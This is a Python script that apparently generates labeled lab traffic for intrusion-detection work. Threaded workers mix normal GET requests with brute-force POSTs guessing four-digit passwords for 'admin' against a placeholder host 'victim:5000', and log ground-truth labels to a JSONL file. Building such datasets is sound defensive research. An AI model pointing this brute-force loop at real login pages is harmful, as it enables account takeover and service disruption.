import requests
import time
import random
import threading
import os
import json


TARGET = "http://victim:5000"
LOGIN_ENDPOINT = "/login"

ATTACK_DURATION = int(os.getenv("ATTACK_DURATION", "30"))
REQUESTS_PER_SECOND = int(os.getenv("REQUESTS_PER_SECOND", "10"))
THREADS = int(os.getenv("THREADS", "3"))

NORMAL_TRAFFIC_RATIO = float(os.getenv("NORMAL_TRAFFIC_RATIO", "0.3"))
RANDOM_SEED = int(os.getenv("RANDOM_SEED", "42"))
SCENARIO_NAME = os.getenv("SCENARIO_NAME", "adhoc")
LABEL_FILE = os.getenv("LABEL_FILE", "/logs/traffic_labels.jsonl")
WARMUP_SECONDS = int(os.getenv("WARMUP_SECONDS", "20"))
COOLDOWN_SECONDS = int(os.getenv("COOLDOWN_SECONDS", "20"))

label_lock = threading.Lock()


def write_label_event(label, worker_id):
    event = {
        "time": time.time(),
        "label": label,
        "worker_id": worker_id,
        "scenario": SCENARIO_NAME,
    }
    with label_lock:
        with open(LABEL_FILE, "a", encoding="utf-8") as handle:
            handle.write(json.dumps(event) + "\n")



def normal_request(worker_id):
    try:
        requests.get(TARGET, timeout=1)
        write_label_event("normal", worker_id)
    except requests.RequestException:
        pass


def brute_force_request(worker_id):
    try:
        requests.post(
            TARGET + LOGIN_ENDPOINT,
            data={
                "username": "admin",
                "password": random.randint(1000, 9999)
            },
            timeout=1
        )
        write_label_event("attack", worker_id)
    except requests.RequestException:
        pass


def attack_worker(worker_id):
    print(f"[Worker {worker_id}] started")

    phase_plan = [
        ("warmup", WARMUP_SECONDS, 1.0),
        ("attack", ATTACK_DURATION, NORMAL_TRAFFIC_RATIO),
        ("cooldown", COOLDOWN_SECONDS, 1.0),
    ]

    for phase_name, phase_seconds, normal_ratio in phase_plan:
        if phase_seconds <= 0:
            continue

        phase_start = time.time()
        while time.time() - phase_start < phase_seconds:
            if random.random() < normal_ratio:
                normal_request(worker_id)
            else:
                brute_force_request(worker_id)

            time.sleep(1 / REQUESTS_PER_SECOND)

        print(f"[Worker {worker_id}] phase completed: {phase_name}")

    print(f"[Worker {worker_id}] finished")



if __name__ == "__main__":
    random.seed(RANDOM_SEED)

    # Reset the label file for each run to keep ground truth clean.
    os.makedirs(os.path.dirname(LABEL_FILE), exist_ok=True)
    with open(LABEL_FILE, "w", encoding="utf-8") as handle:
        metadata = {
            "time": time.time(),
            "event": "start",
            "scenario": SCENARIO_NAME,
            "warmup_seconds": WARMUP_SECONDS,
            "attack_seconds": ATTACK_DURATION,
            "cooldown_seconds": COOLDOWN_SECONDS,
            "rps": REQUESTS_PER_SECOND,
            "threads": THREADS,
            "normal_ratio": NORMAL_TRAFFIC_RATIO,
        }
        handle.write(json.dumps(metadata) + "\n")

    print("🚦 Starting controlled DDoS / brute-force simulation")
    print(f"Target: {TARGET}")
    print(
        "Phases: "
        f"warmup={WARMUP_SECONDS}s, "
        f"attack={ATTACK_DURATION}s, "
        f"cooldown={COOLDOWN_SECONDS}s"
    )
    print(f"Threads: {THREADS}")
    print(f"Rate per thread: {REQUESTS_PER_SECOND} req/s")

    threads = []

    for i in range(THREADS):
        t = threading.Thread(target=attack_worker, args=(i,))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print("Traffic simulation completed")
